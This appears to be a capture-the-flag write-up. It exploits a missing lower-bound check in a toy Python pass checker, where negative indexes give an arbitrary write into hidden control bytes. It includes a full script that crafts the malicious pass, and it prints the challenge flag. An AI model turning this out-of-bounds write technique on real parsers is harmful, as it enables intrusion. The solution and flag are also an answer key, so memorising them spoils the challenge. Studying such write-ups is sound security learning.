# Independence Day Lantern Booth — Writeup

## Challenge Overview

The challenge provides an offline pass checker for volunteers entering a dawn setup area.

The supplied files are:

- `booth_checker.py` — the pass parser and checker
- `sample_pass.bin` — a normal sample pass

The goal is to craft a malicious pass that reaches the hidden `reveal()` action.

---

## 1. Understanding the checker

The checker creates a 128-byte memory buffer:

```python
mem = bytearray(128)
mem[112] = 0
```

The action is selected from:

```python
ACTIONS = [preview, deny, audit, reveal]

action = mem[112] % len(ACTIONS)
ACTIONS[action](mem)
```

Therefore:

| `mem[112]` | Action |
|---:|---|
| 0 | `preview` |
| 1 | `deny` |
| 2 | `audit` |
| 3 | `reveal` |

We need to make:

```text
mem[112] = 3
```

---

## 2. Requirements for `reveal()`

The hidden function checks two values:

```python
zone = bytes(mem[32:40]).rstrip(b"\x00")
token = bytes(mem[113:121])
```

The zone must be:

```text
AUG15
```

The token must be:

```python
hashlib.sha256(b"BOOTH|" + DATE).digest()[:8]
```

where:

```python
DATE = b"15-08-1947"
```

Calculate it:

```bash
python3 - <<'PY'
import hashlib

DATE = b"15-08-1947"
token = hashlib.sha256(b"BOOTH|" + DATE).digest()[:8]

print(token)
print(token.hex())
PY
```

Result:

```text
a62bb4c85b3a767d
```

So the target memory state is:

```text
mem[32:37]  = b"AUG15"
mem[112]    = 03
mem[113:121] = a6 2b b4 c8 5b 3a 76 7d
```

---

## 3. Finding the vulnerable patch logic

Patch records are processed by:

```python
def apply_patch_record(mem, raw_offset, data):
    base = 48
    start = base + signed_byte(raw_offset)

    for i, value in enumerate(data):
        pos = start + i

        if pos < len(mem):
            mem[pos] = value
```

The intended boundary check should be something like:

```python
if 0 <= pos < len(mem):
```

but the checker only tests:

```python
if pos < len(mem):
```

This means **negative positions are accepted**.

Python `bytearray` supports negative indexing:

```python
mem[-1]   # last byte
mem[-2]   # second-last byte
...
mem[-16]  # mem[112]
```

This is the vulnerability.

---

## 4. Turning the bug into an arbitrary write

Patch offsets are interpreted as signed bytes:

```python
def signed_byte(value):
    return value - 256 if value >= 128 else value
```

Choose:

```text
raw_offset = 192
```

Since `192 >= 128`:

```text
signed_byte(192) = 192 - 256
                 = -64
```

The patch starts at:

```text
start = 48 + (-64)
      = -16
```

Therefore the first patch byte is written to:

```python
mem[-16]
```

which is equivalent to:

```python
mem[112]
```

This lets us control the action selector.

The next bytes map as:

```text
patch[0]  -> mem[-16] = mem[112]
patch[1]  -> mem[-15] = mem[113]
...
patch[8]  -> mem[-8]  = mem[120]
```

So we can place the action value and the eight-byte token directly into the hidden fields.

We also need:

```text
mem[32:37] = AUG15
```

Since the patch starts at `-16`, the corresponding patch index is:

```text
32 - (-16) = 48
```

Therefore:

```text
patch[48:53] = b"AUG15"
```

---

## 5. Constructing the malicious pass

The pass format is:

```text
LBTH
count
record_type
record_size
record_data
```

For a patch record:

```text
record_type = 3
record_data[0] = raw_offset
record_data[1:] = patch bytes
```

We use:

```text
count       = 1
record_type = 3
raw_offset  = 192
```

Our patch data is 56 bytes:

```python
data = bytearray(56)

# mem[112] = 3 -> reveal()
data[0] = 3

# mem[113:121] = required token
data[1:9] = bytes.fromhex("a62bb4c85b3a767d")

# mem[32:37] = AUG15
data[48:53] = b"AUG15"
```

The resulting pass can be generated with:

```bash
python3 - <<'PY'
from pathlib import Path

token = bytes.fromhex("a62bb4c85b3a767d")

data = bytearray(56)

# -16 -> mem[112]
data[0] = 3

# -15..-8 -> mem[113:121]
data[1:9] = token

# patch index 48 -> mem[32]
data[48:53] = b"AUG15"

# LBTH + count + type + size + offset + patch data
blob = (
    b"LBTH"
    + bytes([1])             # one record
    + bytes([3])             # patch record
    + bytes([len(data) + 1]) # offset byte + 56 bytes
    + bytes([192])           # signed offset = -64
    + bytes(data)
)

Path("exploit_pass.bin").write_bytes(blob)

print(f"Created exploit_pass.bin ({len(blob)} bytes)")
print(blob.hex())
PY
```

Expected file size:

```text
64 bytes
```

---

## 6. Verify the exploit

Run:

```bash
python3 booth_checker.py exploit_pass.bin
```

The checker reaches `reveal()` and prints:

```text
UNI6CTF{Az4d@Vector_9mK!40}
```

---

## 7. Why the exploit works

The intended validation is:

```python
if 0 <= pos < len(mem):
```

The actual validation is only:

```python
if pos < len(mem):
```

For our chosen offset:

```text
raw_offset = 192
signed offset = -64
start = 48 - 64
      = -16
```

Python interprets:

```python
mem[-16]
```

as:

```python
mem[112]
```

Thus the patch crosses the intended boundary and writes into the hidden control data at the end of the 128-byte buffer.

The exploit simultaneously sets:

```text
mem[112]    = 3
mem[113:121] = required token
mem[32:37]  = AUG15
```

which satisfies all conditions for `reveal()`.

---

## Flag

```text
UNI6CTF{Az4d@Vector_9mK!40}
```

## Vulnerability

**Missing lower-bound validation / negative-index arbitrary write in `apply_patch_record()`.**
